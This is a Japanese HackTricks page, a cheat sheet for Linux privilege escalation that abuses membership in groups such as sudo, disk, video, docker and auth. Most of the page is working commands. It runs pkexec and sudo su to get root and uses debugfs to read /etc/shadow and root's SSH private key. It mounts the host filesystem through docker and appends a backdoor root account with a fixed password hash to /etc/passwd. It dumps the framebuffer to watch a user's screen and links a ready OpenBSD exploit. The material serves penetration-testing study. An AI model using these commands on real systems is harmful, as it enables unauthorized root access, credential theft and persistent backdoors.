# 興味深いグループ - Linux Privesc

<details>

<summary><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

- **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい場合**は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
- [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
- **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)をフォローする
- **ハッキングトリックを共有するためにPRを送信して** [**HackTricks**](https://github.com/carlospolop/hacktricks) および [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のGitHubリポジトリに

</details>

## Sudo/Admin グループ

### **PE - 方法1**

**時々**、**デフォルトで（またはあるソフトウェアが必要とするために）**、**/etc/sudoers**ファイルの中にこれらの行のいくつかを見つけることができます：
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
これは、**sudoまたはadminグループに属するユーザーはsudoとして何でも実行できる**ことを意味します。

この場合、**rootになるには単に実行するだけです**:
```
sudo su
```
### PE - 方法2

すべてのsuidバイナリを見つけ、バイナリ**Pkexec**があるかどうかを確認します：
```bash
find / -perm -4000 2>/dev/null
```
もしバイナリ**pkexecがSUIDバイナリである**ことがわかり、**sudo**または**admin**に所属している場合、おそらく`pkexec`を使用してsudoとしてバイナリを実行できるかもしれません。\
通常、これらは**polkitポリシー**内のグループです。このポリシーは基本的に、どのグループが`pkexec`を使用できるかを識別します。次のコマンドで確認してください：
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
以下では、どのグループが**pkexec**を実行できるか、および**デフォルトで**一部のLinuxディストリビューションでは**sudo**および**admin**グループが表示されます。

**rootになるには、次のコマンドを実行します**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
**pkexec**を実行しようとして、次の**エラー**が表示された場合:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**権限がないわけではなく、GUIなしで接続されていないためです**。そして、この問題の回避策がこちらにあります: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)。**異なる2つのsshセッション**が必要です:

{% code title="session1" %}
```bash
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```
{% endcode %}

{% code title="session2" %}
```bash
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
{% endcode %}

## Wheel Group

**時々**、**デフォルトで**、**/etc/sudoers** ファイルの中にこの行が見つかることがあります：
```
%wheel	ALL=(ALL:ALL) ALL
```
これは、**wheelグループに属するユーザーはsudoとして何でも実行できる**ことを意味します。

この場合、**rootになるためには単に実行するだけです**:
```
sudo su
```
## シャドウグループ

**グループシャドウ**のユーザーは、**/etc/shadow**ファイルを**読む**ことができます。
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
## ディスクグループ

この特権は、マシン内のすべてのデータにアクセスできるため、ほぼルートアクセスと同等です。

ファイル：`/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
注意してください。debugfsを使用して**ファイルを書き込む**こともできます。たとえば、`/tmp/asd1.txt`を`/tmp/asd2.txt`にコピーするには、次のようにします：
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
しかし、**root所有のファイルを書き込もうとする**と（例：`/etc/shadow`や`/etc/passwd`）、**Permission denied**エラーが発生します。

## Video Group

コマンド`w`を使用すると、**システムにログインしているユーザー**を見つけることができ、以下のような出力が表示されます：
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1**は、ユーザー**yossiが物理的に**マシンの端末にログインしていることを意味します。

**videoグループ**は、画面出力を表示する権限を持っています。基本的に、画面を観察することができます。これを行うには、画面上の現在のイメージを生データで取得し、画面が使用している解像度を取得する必要があります。画面データは`/dev/fb0`に保存でき、この画面の解像度は`/sys/class/graphics/fb0/virtual_size`で見つけることができます。
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
**ルートグループ**

デフォルトでは、**ルートグループのメンバー**がいくつかの**サービス**構成ファイルや**ライブラリ**ファイル、または権限昇格に使用できる**その他の興味深いもの**を変更できる可能性があります...

**ルートメンバーが変更できるファイルを確認します**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Docker グループ

インスタンスのボリュームにホストマシンのルートファイルシステムをマウントできるため、インスタンスが起動するとすぐにそのボリュームに `chroot` がロードされます。これにより、実質的にマシン上で root 権限を取得できます。
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
## lxc/lxd グループ

{% content-ref url="./" %}
[.](./)
{% endcontent-ref %}

## Adm グループ

通常、**`adm`** グループの**メンバー**は _/var/log/_ 内にある**ログファイルを読む**権限を持っています。\
したがって、このグループ内のユーザーが侵害された場合は、**ログを確認**する必要があります。

## Auth グループ

OpenBSD内では、**auth** グループは通常、使用されている場合は _**/etc/skey**_ と _**/var/db/yubikey**_ のフォルダに書き込むことができます。\
これらの権限は、次のエクスプロイトを使用して特権を昇格させるために悪用される可能性があります: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
